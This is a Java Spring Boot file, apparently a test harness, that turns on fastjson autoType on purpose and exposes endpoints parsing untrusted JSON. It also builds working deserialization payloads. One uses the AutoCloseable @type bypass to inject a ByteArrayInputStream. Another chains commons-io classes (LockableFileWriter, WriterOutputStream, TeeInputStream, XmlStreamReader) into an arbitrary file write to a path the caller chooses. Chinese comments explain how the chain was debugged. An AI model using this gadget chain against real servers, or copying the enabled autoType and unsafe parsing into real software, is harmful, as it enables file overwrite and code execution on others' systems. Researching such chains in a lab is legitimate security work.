package com.test;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.auth0.jwt.JWT;
import com.auth0.jwt.interfaces.DecodedJWT;
import org.apache.commons.io.input.CharSequenceReader;
import org.apache.commons.io.input.ReaderInputStream;
import org.apache.commons.io.input.TeeInputStream;
import org.apache.commons.io.output.LockableFileWriter;
import org.apache.commons.io.output.WriterOutputStream;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;

@SpringBootApplication
@RestController
public class App {

    static final Logger log = LoggerFactory.getLogger(App.class);

    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        log.info("[BOOT] autoType={}", ParserConfig.getGlobalInstance().isAutoTypeSupport());
        SpringApplication.run(App.class, args);
    }

    @PostMapping("/notify/v2")
    public Map<String, Object> notifyV2(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            DecodedJWT jwt = JWT.decode(body.get("signedPayload"));
            String header = new String(Base64.getDecoder().decode(jwt.getHeader()), StandardCharsets.UTF_8);
            log.info("[V2] preview={}", header.substring(0, Math.min(80, header.length())));
            JSONObject.parseObject(header);
            r.put("code", 500); r.put("msg", "ok");
        } catch (NullPointerException e) {
            r.put("code", 500); r.put("msg", "NPE-ok");
        } catch (Exception e) {
            log.error("[V2-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("code", 500); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    @PostMapping(value = "/raw", consumes = "*/*")
    public Map<String, Object> raw(HttpServletRequest request) {
        Map<String, Object> r = new LinkedHashMap<>();
        try {
            String json = new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            log.info("[RAW] len={}", json.length());
            JSONObject.parseObject(json);
            r.put("ok", true);
        } catch (Exception e) {
            log.error("[RAW-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            StringWriter sw = new StringWriter(); e.printStackTrace(new PrintWriter(sw));
            log.error("[RAW-STACK] {}", sw);
            r.put("ok", false); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
        }
        return r;
    }

    @PostMapping("/diag/chain")
    public Map<String, Object> diagChain(@RequestBody Map<String, String> body) {
        Map<String, Object> r = new LinkedHashMap<>();
        String file = body.getOrDefault("file", "/tmp/chain_test");
        String content = body.getOrDefault("content", "CHAIN-TEST\n");
        try {
            String padded = content + " ".repeat(Math.max(0, 8193 - content.length()));
            Charset cs = Charset.forName("iso-8859-1");
            ReaderInputStream ris = new ReaderInputStream(new CharSequenceReader(padded), cs, 1);
            LockableFileWriter lfw = new LockableFileWriter(new File(file), "iso-8859-1", false, "/tmp");
            WriterOutputStream wos = new WriterOutputStream(lfw, cs, 1, true);
            TeeInputStream tee = new TeeInputStream(ris, wos, true);
            byte[] buf = new byte[8192]; while (tee.read(buf) != -1) {}
            tee.close();
            r.put("ok", true); r.put("file", file);
        } catch (Exception e) {
            log.error("[CHAIN-ERR] {}:{}", e.getClass().getName(), e.getMessage());
            r.put("ok", false); r.put("msg", e.getMessage());
        }
        return r;
    }

    /**
     * step=G  注入 buf + count，验证 ByteArrayInputStream 可正常读取
     * step=H  完整链 + buf+count 注入，验证文件写入
     */
    @PostMapping("/diag/step")
    public Map<String, Object> diagStep(@RequestBody Map<String, String> body) {
        String step = body.getOrDefault("step", "G");
        String file = body.getOrDefault("file", "/tmp/step_" + step);
        String content = body.getOrDefault("content", "STEP-" + step + "-OK\n");
        Map<String, Object> r = new LinkedHashMap<>();

        byte[] contentBytes = content.getBytes(StandardCharsets.ISO_8859_1);
        // 使用实际内容长度，不填充，count = contentBytes.length
        String b64Content = Base64.getEncoder().encodeToString(contentBytes);
        int byteLen = contentBytes.length;
        String escapedFile = file.replace("\\", "\\\\").replace("\"", "\\\"");

        try {
            switch (step) {

                case "G": {
                    // 关键修复：同时注入 buf 和 count
                    // ByteArrayInputStream.read() 判断 pos < count，count=0 则立即返回 -1
                    // fastjson 反射只注入 buf，count 保持 0
                    // 解决方案：在 JSON 中额外注入 count 字段
                    String json = "{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"java.io.ByteArrayInputStream\","
                            + "\"buf\":\"" + b64Content + "\","
                            + "\"count\":" + byteLen + "}";

                    log.info("[STEP-G] json={}", json);
                    Object result = JSONObject.parseObject(json);
                    log.info("[STEP-G] parseObject OK, type={}", result == null ? "null" : result.getClass().getName());

                    if (result instanceof ByteArrayInputStream) {
                        ByteArrayInputStream bais = (ByteArrayInputStream) result;
                        // 反射检查 count
                        Field countField = ByteArrayInputStream.class.getDeclaredField("count");
                        countField.setAccessible(true);
                        int countVal = (int) countField.get(bais);
                        Field posField = ByteArrayInputStream.class.getDeclaredField("pos");
                        posField.setAccessible(true);
                        int posVal = (int) posField.get(bais);
                        log.info("[STEP-G] bais.count={} bais.pos={}", countVal, posVal);
                        r.put("count", countVal);
                        r.put("pos", posVal);

                        // 尝试读取
                        byte[] buf = new byte[1024];
                        int n = bais.read(buf);
                        log.info("[STEP-G] read {} bytes: {}", n, n > 0 ? new String(buf, 0, Math.min(n, 20)) : "(none)");
                        r.put("readBytes", n);
                        r.put("readPreview", n > 0 ? new String(buf, 0, Math.min(n, 20)) : "(none)");
                    } else {
                        log.info("[STEP-G] result is not ByteArrayInputStream but {}", result == null ? "null" : result.getClass());
                        r.put("resultType", result == null ? "null" : result.getClass().getSimpleName());
                    }
                    r.put("ok", true);
                    break;
                }

                case "H": {
                    // 完整链，buf + count 同时注入
                    String json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
                            // LockableFileWriter
                            + "\"lfw\":{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
                            + "\"file\":\"" + escapedFile + "\","
                            + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
                            // WriterOutputStream → lfw
                            + "\"wos\":{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
                            + "\"writer\":{\"$ref\":\"$.lfw\"},"
                            + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true},"
                            // ByteArrayInputStream，buf + count 同时注入
                            + "\"bais\":{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"java.io.ByteArrayInputStream\","
                            + "\"buf\":\"" + b64Content + "\","
                            + "\"count\":" + byteLen + "},"
                            // TeeInputStream：bais → wos
                            + "\"tee\":{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"org.apache.commons.io.input.TeeInputStream\","
                            + "\"input\":{\"$ref\":\"$.bais\"},"
                            + "\"branch\":{\"$ref\":\"$.wos\"},"
                            + "\"closeBranch\":true},"
                            // XmlStreamReader：构造时读 tee，驱动数据流
                            + "\"xml\":{\"@type\":\"java.lang.AutoCloseable\","
                            + "\"@type\":\"org.apache.commons.io.input.XmlStreamReader\","
                            + "\"is\":{\"$ref\":\"$.tee\"},"
                            + "\"httpContentType\":\"text/xml\","
                            + "\"lenient\":true,"
                            + "\"defaultEncoding\":\"iso-8859-1\"}"
                            + "}";

                    log.info("[STEP-H] json len={}", json.length());
                    JSONObject result = JSONObject.parseObject(json);
                    log.info("[STEP-H] parseObject OK, keys={}", result == null ? "null" : result.keySet());

                    File f = new File(file);
                    log.info("[STEP-H] file exists={} size={}", f.exists(), f.exists() ? f.length() : -1);
                    r.put("fileExists", f.exists());
                    r.put("fileSize", f.exists() ? f.length() : -1);
                    r.put("ok", true);
                    break;
                }

                default:
                    r.put("ok", false); r.put("msg", "step must be G or H"); return r;
            }

        } catch (Exception e) {
            log.error("[STEP-{}-ERR] {}:{}", step, e.getClass().getName(), e.getMessage());
            StringWriter sw = new StringWriter(); e.printStackTrace(new PrintWriter(sw));
            log.error("[STEP-{}-STACK]\n{}", step, sw);
            r.put("ok", false);
            r.put("type", e.getClass().getSimpleName());
            r.put("msg", e.getMessage());
            File f = new File(file);
            r.put("fileExists", f.exists());
            r.put("fileSize", f.exists() ? f.length() : -1);
        }
        return r;
    }
}
